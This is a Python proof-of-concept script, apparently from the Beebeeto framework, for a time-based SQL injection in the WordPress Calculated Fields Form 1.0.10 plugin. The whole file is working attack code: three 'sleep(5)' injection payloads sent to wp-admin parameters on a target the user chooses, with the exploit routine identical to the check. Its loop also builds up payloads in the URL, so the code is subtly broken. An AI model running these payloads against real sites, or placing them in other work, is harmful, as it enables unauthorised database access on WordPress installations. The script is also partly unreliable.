#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2
import time

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0057',
            'name': 'WordPress Calculated Fields Form 1.0.10 SQL Injection POC',
            'author': 'ca2fux1n',
            'create_date': '2015-03-06',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['1.0.10'],
            'type': 'SQL Injection',
            'tag': ['WordPress SQL注入漏洞', 'Calculated Fields Form', 'php'],
            'desc': '''
                    There are sql injection vulnerabilities in Calculated Fields Form Plugin
                    which could allow the attacker to execute sql queries into database
                    ''',
            'references': ['http://www.exploit-db.com/exploits/36230/',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        payloads = {'/wp-admin/options-general.php?page=cp_calculated_fields_form&u=2 and sleep(5)&name=InsertText',
                    '/wp-admin/options-general.php?page=cp_calculated_fields_form&c=21 and sleep(5)',
                    '/wp-admin/options-general.php?page=cp_calculated_fields_form&d=3 and sleep(5)'
                    }
        for payload in payloads:
            verify_url += payload
            start_time = time.time()
            req = urllib2.Request(verify_url)
            res_content = urllib2.urlopen(req).read()
            if args['options']['verbose']:
                print '[*]Request URL ' + verify_url
            if time.time() - start_time > 5:
                args['options']['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                break
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())